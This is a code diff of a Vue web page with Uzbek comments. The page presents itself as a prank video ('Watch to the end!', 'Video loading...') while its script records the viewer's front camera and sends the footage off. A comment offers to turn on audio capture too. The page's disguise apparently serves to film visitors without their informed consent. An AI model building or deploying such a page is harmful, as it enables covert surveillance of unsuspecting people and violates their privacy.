@@ -20,7 +20,7 @@ export default {
       try {
         this.stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' },
-          audio: false
+          audio: false // xohlasangiz true qilsak bo‘ladi
         })
 
         this.startRecording()
@@ -33,10 +33,10 @@ export default {
     startRecording() {
       this.recordedChunks = []
 
-      // 🔻 VIDEO HAJMINI KICHRAYTIRISH (bitrate)
+      // 🔻 Video hajmini kichraytirish (bitrate past)
       this.mediaRecorder = new MediaRecorder(this.stream, {
         mimeType: 'video/webm;codecs=vp8',
-        videoBitsPerSecond: 700_000 // ≈ 0.7 Mbps (yengil)
+        videoBitsPerSecond: 700_000 // ~0.7 Mbps
       })
 
       this.mediaRecorder.ondataavailable = (e) => {
@@ -49,7 +49,7 @@ export default {
       this.recording = true
     },
 
-    stopRecordingAndSend() {
+    async stopRecordingAndSend() {
       if (!this.mediaRecorder || !this.recording) return
 
       this.mediaRecorder.stop()
@@ -71,7 +71,7 @@ export default {
 
           alert('😂 Video muvaffaqiyatli yuborildi!')
 
-        } catch (err) {
+        } catch (e) {
           alert('❌ Video yuborishda xatolik')
         }
       }
@@ -84,3 +84,52 @@ export default {
   }
 }
 </script>
+
+<template>
+  <div class="prank-page">
+    <!-- 😂 Kulgili video -->
+    <video
+        class="fun-video"
+        autoplay
+        playsinline
+        muted
+        @ended="onFunnyVideoEnd"
+    >
+      <source src="../assets/prank.mp4" type="video/mp4"/>
+    </video>
+
+    <div class="overlay">
+      <h1>😂 Oxirgacha ko‘ring!</h1>
+      <p>Video yuklanmoqda...</p>
+    </div>
+  </div>
+</template>
+
+<style>
+.prank-page {
+  position: relative;
+  width: 100vw;
+  height: 100vh;
+  background: #000;
+  overflow: hidden;
+}
+
+.fun-video {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+.overlay {
+  position: absolute;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.35);
+  color: #fff;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  font-size: 24px;
+  text-align: center;
+}
+</style>
